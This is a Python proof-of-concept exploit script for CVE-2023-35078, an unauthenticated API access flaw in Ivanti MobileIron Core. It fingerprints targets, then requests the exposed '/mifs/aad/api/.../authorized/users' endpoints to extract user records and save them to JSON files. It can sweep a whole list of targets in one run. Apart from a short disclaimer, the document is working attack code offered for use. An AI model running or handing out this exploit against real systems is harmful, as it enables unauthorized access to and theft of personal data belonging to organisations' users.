#!/usr/bin/env python3

import requests
import sys
import json
import argparse
import urllib3
import os
from datetime import datetime
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from termcolor import colored
except ImportError:
    def colored(text, color):
        return text

def banner():
    print("""
          
██████╗ ███╗   ██╗███████╗███████╗ ██████╗
██╔═████╗████╗  ██║██╔════╝██╔════╝██╔════╝
██║██╔██║██╔██╗ ██║███████╗█████╗  ██║     
████╔╝██║██║╚██╗██║╚════██║██╔══╝  ██║     
╚██████╔╝██║ ╚████║███████║███████╗╚██████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝
 
[+] CVE-2023-35078 - Ivanti MobileIron Core Remote Unauthenticated API Access
[+] Description:
This script demonstrates an ethical Proof of Concept (PoC) for CVE-2023-35078.
The vulnerability allows unauthorized access to sensitive user data through an insecure API endpoint
in Ivanti MobileIron Core versions 11.2, 11.3, and 11.4 prior to 11.4 CU8, 11.3 CU18, and 11.2 CU21.

[+] CVSS Score: 9.8 (Critical)
[+] CVE Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-35078

[+] Disclaimer:
This script is for educational and authorized security testing purposes ONLY.
- Only use with explicit written permission from the system owner
- Unauthorized access to computer systems is illegal
- Author is not responsible for misuse of this tool

[+] Usage:
python3 cve_2023_35078.py -u https://target.com
python3 cve_2023_35078.py -f targets.txt
python3 cve_2023_35078.py -u https://target.com --output results/
python3 cve_2023_35078.py -f targets.txt --timeout 10 --verbose

[+] Author: 0nsec (https://github.com/0nsec)
""")

def validate_url(url):
    """Validate and normalize URL format"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    try:
        parsed = urlparse(url)
        if not parsed.netloc:
            return None
        return url.rstrip('/')
    except Exception:
        return None

def check_ivanti_mobileiron_version(url, timeout=10, verbose=False):
    """
    Check if target is running vulnerable Ivanti MobileIron Core version
    Vulnerable versions: 11.2, 11.3, 11.4 prior to patches
    """
    if verbose:
        print(f"[*] Checking version for: {url}")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        response = requests.get(url, verify=False, timeout=timeout, headers=headers)
        if response.status_code != 200:
            if verbose:
                print(f"[-] HTTP {response.status_code} - Not accessible")
            return False
        
        version_patterns = [
            "ui.login.css?",
            "mifs/css/ui.login.css?",
            "version="
        ]
        
        for pattern in version_patterns:
            version_start = response.text.find(pattern)
            if version_start != -1:
                version_end = response.text.find('"', version_start)
                if version_end == -1:
                    version_end = response.text.find('&', version_start)
                
                version_str = response.text[version_start + len(pattern):version_end]
                print(f"[*] Detected version: {version_str}")
                
                # Check version is vulnerable..
                try:
                    version_num = float(version_str.split('.')[0] + '.' + version_str.split('.')[1])
                    if 11.2 <= version_num <= 11.4:
                        print(colored("[+] Target appears VULNERABLE!", "red"))
                        return True
                except (ValueError, IndexError):
                    if verbose:
                        print(f"[-] Could not parse version: {version_str}")
        
        # Check for MobileIron indicators even without version...
        mobileiron_indicators = [
            "MobileIron",
            "mifs/",
            "mobileiron",
            "/mifs/css/",
            "mi-logo"
        ]
        
        for indicator in mobileiron_indicators:
            if indicator.lower() in response.text.lower():
                print(colored("[?] MobileIron detected but version unclear - attempting exploit", "yellow"))
                return True
        
        if verbose:
            print("[-] No MobileIron indicators found")
        return False
        
    except requests.exceptions.Timeout:
        print(colored("[-] Connection timeout", "red"))
        return False
    except requests.exceptions.ConnectionError:
        print(colored("[-] Connection failed", "red"))
        return False
    except Exception as e:
        if verbose:
            print(f"[-] Error checking version: {str(e)}")
        return False

def exploit_users_endpoint(url, output_dir=None, timeout=10, verbose=False):
    """
    Exploit the vulnerable API endpoint to extract user data
    """
    endpoints = [
        "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1",
        "/mifs/aad/api/v2/authorized/users",
        "/mifs/aad/api/v1/authorized/users?adminDeviceSpaceId=1",
        "/mifs/aad/api/v1/authorized/users"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; security-scanner/1.0)',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
    
    print(f"[*] Attempting to exploit: {url}")
    
    for endpoint in endpoints:
        vuln_url = url + endpoint
        if verbose:
            print(f"[*] Trying endpoint: {endpoint}")
        
        try:
            response = requests.get(vuln_url, verify=False, timeout=timeout, headers=headers)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list) and len(data) > 0:
                        print(colored(f"[+] SUCCESS! Found {len(data)} users", "green"))
                        save_results(url, data, output_dir, endpoint)
                        return True
                    elif isinstance(data, dict) and data:
                        print(colored("[+] SUCCESS! Found user data", "green"))
                        save_results(url, data, output_dir, endpoint)
                        return True
                except json.JSONDecodeError:
                    if len(response.text) > 100 and any(keyword in response.text.lower() for keyword in ['user', 'email', 'name', 'id']):
                        print(colored("[+] SUCCESS! Found potential user data (non-JSON)", "green"))
                        save_results(url, response.text, output_dir, endpoint)
                        return True
            
            elif verbose and response.status_code not in [404, 403]:
                print(f"[-] HTTP {response.status_code} for {endpoint}")
                
        except requests.exceptions.Timeout:
            if verbose:
                print(f"[-] Timeout for endpoint: {endpoint}")
            continue
        except Exception as e:
            if verbose:
                print(f"[-] Error with endpoint {endpoint}: {str(e)}")
            continue
    
    print(colored("[-] Exploitation failed - no vulnerable endpoints found", "red"))
    return False

def save_results(url, data, output_dir=None, endpoint=""):
    """Save exploitation results to file"""
    try:
        if output_dir:
            os.makedirs(output_dir, exist_ok=True)
            base_path = output_dir
        else:
            base_path = "."
        
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc.replace(':', '_').replace('/', '_')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{base_path}/{hostname}_{timestamp}.json"
        
        output_data = {
            "timestamp": datetime.now().isoformat(),
            "target_url": url,
            "exploited_endpoint": endpoint,
            "cve": "CVE-2023-35078",
            "data": data
        }
        
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(output_data, f, indent=2, ensure_ascii=False)
        
        print(colored(f"[+] Results saved to: {filename}", "green"))
        
        if isinstance(data, list):
            print(colored(f"[+] Extracted {len(data)} user records", "green"))
            if len(data) > 0 and isinstance(data[0], dict):
                print(f"[*] Sample fields: {list(data[0].keys())[:5]}...")
        elif isinstance(data, dict):
            print(colored(f"[+] Extracted user data with {len(data)} fields", "green"))
        
    except Exception as e:
        print(colored(f"[-] Error saving results: {str(e)}", "red"))

def process_target(url, output_dir=None, timeout=10, verbose=False):
    """Process a single target"""
    url = validate_url(url)
    if not url:
        print(colored(f"[-] Invalid URL format: {url}", "red"))
        return False
    
    print(f"\n[*] Target: {url}")
    print("-" * 60)

    if check_ivanti_mobileiron_version(url, timeout, verbose):
        return exploit_users_endpoint(url, output_dir, timeout, verbose)
    else:
        print(colored("[-] Target does not appear vulnerable", "red"))
        return False

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2023-35078 - Ivanti MobileIron Core Unauthenticated API Access Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-u', '--url', help='Single target URL to test')
    parser.add_argument('-f', '--file', help='File containing target URLs (one per line)')
    parser.add_argument('-o', '--output', help='Output directory for results (default: current directory)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    banner()
    
    successful_exploits = 0
    total_targets = 0
    
    try:
        if args.file:
            print(colored(f"[*] Reading targets from: {args.file}", "cyan"))
            try:
                with open(args.file, "r", encoding="utf-8") as f:
                    urls = [line.strip() for line in f.readlines() if line.strip() and not line.startswith('#')]
                
                total_targets = len(urls)
                print(colored(f"[*] Loaded {total_targets} targets", "cyan"))
                
                for i, url in enumerate(urls, 1):
                    print(colored(f"\n[*] Progress: {i}/{total_targets}", "cyan"))
                    if process_target(url, args.output, args.timeout, args.verbose):
                        successful_exploits += 1
                        
            except FileNotFoundError:
                print(colored(f"[-] File not found: {args.file}", "red"))
                sys.exit(1)
            except Exception as e:
                print(colored(f"[-] Error reading file: {str(e)}", "red"))
                sys.exit(1)
                
        elif args.url:
            total_targets = 1
            if process_target(args.url, args.output, args.timeout, args.verbose):
                successful_exploits += 1
    
    except KeyboardInterrupt:
        print(colored("\n[!] Interrupted by user", "yellow"))
    except Exception as e:
        print(colored(f"[-] Unexpected error: {str(e)}", "red"))
    
    print("\n" + "=" * 60)
    print(colored(f"[*] Scan completed!", "cyan"))
    print(colored(f"[*] Targets processed: {total_targets}", "cyan"))
    print(colored(f"[*] Successful exploits: {successful_exploits}", "green" if successful_exploits > 0 else "red"))
    
    if successful_exploits > 0:
        print(colored(f"[!] WARNING: {successful_exploits} vulnerable system(s) found!", "red"))
        print(colored("[!] Ensure proper authorization before testing!", "red"))

if __name__ == "__main__":
    main()
